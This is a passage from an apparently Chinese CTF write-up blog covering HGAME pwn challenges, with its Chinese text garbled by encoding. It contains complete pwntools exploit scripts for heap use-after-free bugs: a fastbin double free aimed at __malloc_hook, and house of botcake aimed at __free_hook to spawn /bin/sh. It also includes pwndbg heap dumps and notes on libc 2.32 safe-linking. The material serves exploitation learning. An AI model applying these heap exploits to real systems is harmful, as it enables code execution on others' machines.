class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="fast-note"><a href="#fast-note" class="headerlink" title="fast_note"></a>fast_note</h3><p><code>libc2.23</code>ä¸‹çš„<code>uaf</code>æ¼æ´ï¼Œæ— <code>edit</code>åŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½å’Œä¸Šè¿°ä¸€æ ·ï¼Œå› æ­¤å¯ä»¥æ„é€ <code>double free</code>ã€‚</p><ul><li>ç”³è¯·ä¸¤ä¸ªå †ï¼Œç¬¬ä¸€ä¸ªæœ‰<code>unsortedbin</code>å¤§å°ï¼Œé‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œæ³„éœ²<code>libc</code>ã€‚</li><li>å†ç”³è¯·ä¸¤ä¸ªæ•°æ®å¤§å°ä¸º<code>0x60</code>çš„å †ï¼Œé‡Šæ”¾å…¶ä¸­ç¬¬ä¸€ä¸ªï¼Œå†é‡Šæ”¾ç¬¬äºŒä¸ªï¼Œå†é‡Šæ”¾ç¬¬ä¸€ä¸ªï¼Œç»•è¿‡æ£€æŸ¥ï¼Œè¾¾æˆ<code>double free</code>ã€‚</li><li>å†ç”³è¯·ä¸€ä¸ªæ•°æ®å¤§å°ä¸º<code>0x60</code>çš„å †ï¼Œå¹¶ä¿®æ”¹å…¶<code>fd</code>æŒ‡å‘<code>__malloc_hook-0x23</code>å¤„ã€‚</li><li>å°†<code>__malloc_hook-0x23</code>å¤„çš„å †å—ç”³è¯·è¿‡æ¥ï¼Œä¿®æ”¹<code>__malloc_hook</code>ä¸º<code>one_gadget</code>ï¼Œå¿…è¦æ—¶ç”¨<code>realloc</code>è¿›è¡Œè°ƒæ•´ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30160</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">104</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log,success(<span class="string">&quot;libc_base==&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">gadgets=[<span class="number">0x4527a</span>,<span class="number">0x45226</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=libc_base+gadgets[<span class="number">3</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;realloc&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x60</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">0x6</span>))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="new-fast-note"><a href="#new-fast-note" class="headerlink" title="new_fast_note"></a>new_fast_note</h3><p><code>libc2.31</code>ä¸‹çš„<code>uaf</code>æ¼æ´ï¼Œæ— <code>edit</code>åŠŸèƒ½ï¼Œå…¶ä»–åŠŸèƒ½å’Œä¸Šè¿°ä¸€æ ·ã€‚ç”±äºå¼•å…¥äº†<code>tcache</code>ï¼Œè¿™é‡Œå­¦ä¹ äº†ä¸€ç§æ–°çš„<code>double free</code>åˆ©ç”¨æ‰‹æ³•<code>house of botcake</code>ã€‚<a href="https://www.cnblogs.com/brain-Z/p/16853137.html">å‚è€ƒæ–‡ç« </a></p><ul><li>åˆ†é…9ä¸ª<code>unsortedbin</code> å¤§å°çš„å †å—ï¼Œé‡Šæ”¾æ‰å‰7ä¸ªï¼Œå†ç”³è¯·ä¸€ä¸ªä¿æŠ¤å †å—é˜²æ­¢åˆå¹¶ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>é‡Šæ”¾æ‰ç¬¬9ä¸ªå †å—ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6710</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6710</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><ul><li>é‡Šæ”¾æ‰ç¬¬8ä¸ªå †å—ï¼Œè§¦å‘<code>unsortedbin consolidate</code>åˆå¹¶ä¸ºä¸€ä¸ªå¤§å †å—ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6600</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">30</span>gx <span class="number">0x563c55bf6680</span></span><br><span class="line"><span class="number">0x563c55bf6680</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000121</span></span><br><span class="line"><span class="number">0x563c55bf6690</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf66a0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66b0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66c0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66d0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66e0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf66f0</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6700</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6710</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x563c55bf6720</span>:<span class="number">0x00007fe8d8e26be0</span><span class="number">0x00007fe8d8e26be0</span></span><br><span class="line"><span class="number">0x563c55bf6730</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6740</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6750</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x563c55bf6760</span>:<span class="number">0x6161616161616161</span><span class="number">0x6161616161616161</span></span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·ä¸€ä¸ªå †å—(Tcacheä¼˜å…ˆ)ï¼Œå†é‡Šæ”¾æ‰ç¬¬9ä¸ªå †å—ï¼Œæ­¤æ—¶ä¸¤ä¸ªæŒ‡é’ˆåˆ†åˆ«ä½äº<code>unsortedbin</code>ä¸­å’Œ<code>tcache</code>ä¸­ï¼Œå®Œæˆäº†<code>double free</code>ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> â€”â–¸ <span class="number">0x563c55bf6570</span> â€”â–¸ <span class="number">0x563c55bf64e0</span> â€”â–¸ <span class="number">0x563c55bf6450</span> â€”â–¸ <span class="number">0x563c55bf63c0</span> â€”â–¸ <span class="number">0x563c55bf6330</span> â€”â–¸ <span class="number">0x563c55bf62a0</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6680</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6680</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>åªéœ€ç”³è¯·ä¸€ä¸ªæ¯”ç¬¬9ä¸ªå †å—å¤§çš„å †å—ï¼Œä¾¿èƒ½åˆ‡å‰²<code>unsortedbin</code>ï¼Œåœ¨ç¬¬9ä¸ªå †å—å¤„çš„<code>fd</code>æŒ‡é’ˆç•™ä¸‹<code>__free_hook</code>å³å¯ã€‚</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tcachebins</span><br><span class="line"><span class="number">0x90</span> [  <span class="number">7</span>]: <span class="number">0x563c55bf6720</span> â€”â–¸ <span class="number">0x7fe8d8e28e48</span> (__free_hook) â—‚â€” <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6730</span> â€”â–¸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) â—‚â€” <span class="number">0x563c55bf6730</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><ul><li>ç”³è¯·åˆ°<code>__free_hook</code>ä¸º<code>system</code>ï¼Œé‡Šæ”¾æ•°æ®ä¸º<code>/bin/sh</code>çš„å †å—å³å¯ã€‚</li><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30439</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">&#x27;protectt&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xa0</span>,p64(free_hook)*<span class="number">20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>,p64(system))</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure><h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h2><h3 id="libc-2-32é¢„å¤‡çŸ¥è¯†"><a href="#libc-2-32é¢„å¤‡çŸ¥è¯†" class="headerlink" title="libc-2.32é¢„å¤‡çŸ¥è¯†"></a>libc-2.32é¢„å¤‡çŸ¥è¯†</h3><ul><li>å¼•å…¥äº†<code>-safe-linking(å¼‚æˆ–åŠ å¯†)</code>æœºåˆ¶ï¼Œå…¶æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå°†<strong>æŒ‡é’ˆçš„åœ°å€</strong>å³ç§»12ä½å†å’Œ<strong>æŒ‡é’ˆæœ¬èº«</strong>å¼‚æˆ–ï¼Œè¯¥æ“ä½œåœ¨å †å—<strong>è¿›å…¥å’Œé€€å‡º</strong><code>tcache bin</code>æ—¶è¿›è¡Œï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><ul><li><code>chunk</code>æ”¾å…¥<code>tcache bin</code>æ—¶ï¼Œå…¶<code>fd</code>æŒ‡é’ˆä¼šè¿›è¡Œ<code>å¼‚æˆ–åŠ å¯†</code>ï¼Œå…¶<code>bk</code>æŒ‡é’ˆä¼šæ”¾å…¥<code>tcache</code>ï¼Œä»¥é˜²<code>double free</code>ã€‚</li><li><code>chunk</code>ä»<code>tcache bin</code>è¢«å–å‡ºæ—¶ï¼Œå…¶<code>fd</code>æŒ‡é’ˆè¿›è¡Œ<code>åå¼‚æˆ–æ“ä½œ</code>ï¼Œå…¶<code>bk</code>æŒ‡é’ˆæ¸…é›¶ã€‚</li><li>ä»¥ä¸‹å›¾ä¸ºä¾‹äº†è§£<code>-safe-linking</code>ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/162275/25/34595/91544/63d209b1F634efe7f/8e1d58f50172a469.png" style="zoom:80%;" /><ul><li>å½“ç¬¬ä¸€ä¸ª<code>chunk</code>è¿›å…¥<code>tcache bin</code>æ—¶ï¼Œç”±äº<code>tcache</code>æ­¤æ—¶ä¸ºç©ºï¼Œæ•…<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0</code>ã€‚</li><li>å½“ç¬¬äºŒä¸ª<code>chunk</code>è¿›å…¥<code>tcache 